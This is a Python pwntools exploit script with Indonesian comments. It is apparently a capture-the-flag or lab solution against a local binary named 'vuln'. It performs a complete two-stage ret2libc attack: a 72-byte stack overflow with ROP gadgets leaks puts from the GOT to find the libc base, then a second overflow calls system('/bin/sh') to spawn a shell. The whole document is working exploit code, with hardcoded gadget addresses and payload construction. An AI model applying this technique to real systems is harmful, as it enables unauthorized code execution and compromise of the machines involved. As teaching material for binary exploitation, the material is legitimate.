from pwn import *

elf  = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p    = process('./vuln')

context.log_level = 'info'

# ── Alamat tetap dari binary (no-PIE) ──
pop_rdi  = 0x40113a          # pop rdi ; ret  ← dari ROPgadget
ret      = 0x40101a          # ret            ← untuk stack alignment
puts_plt = 0x401030          # puts@plt
puts_got = 0x404018          # puts@got
main     = 0x40116a          # main

# ── Offset di libc ──
puts_offset   = libc.symbols['puts']    # 0x80e50
system_offset = libc.symbols['system']  # 0x50d70

offset = 72

# ════════════════════════════════════════
# STAGE 1: leak puts@libc
# ════════════════════════════════════════
log.info("STAGE 1: Leaking puts@libc...")

payload1  = b"A" * offset
payload1 += p64(pop_rdi)     # pop rdi ; ret
payload1 += p64(puts_got)    # rdi = puts@got
payload1 += p64(puts_plt)    # puts(puts@got) → cetak alamat puts di libc
payload1 += p64(main)        # kembali ke main untuk stage 2

p.recvuntil(b"Input:\n")
p.sendline(payload1)

# Baca 6 byte leak
leak_raw  = p.recv(6)
puts_leak = u64(leak_raw.ljust(8, b'\x00'))
log.success(f"puts@libc  = {hex(puts_leak)}")

# ── Hitung semua alamat dari libc_base ──
libc_base = puts_leak - puts_offset
system    = libc_base + system_offset
binsh     = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"libc base  = {hex(libc_base)}")
log.success(f"system()   = {hex(system)}")
log.success(f"/bin/sh    = {hex(binsh)}")

# ════════════════════════════════════════
# STAGE 2: system("/bin/sh")
# ════════════════════════════════════════
log.info("STAGE 2: Spawning shell...")

p.recvuntil(b"Input:\n")

payload2  = b"A" * offset
payload2 += p64(ret)         # stack alignment — wajib di x64
payload2 += p64(pop_rdi)     # pop rdi ; ret
payload2 += p64(binsh)       # rdi = "/bin/sh"
payload2 += p64(system)      # system("/bin/sh")

p.sendline(payload2)
p.interactive()

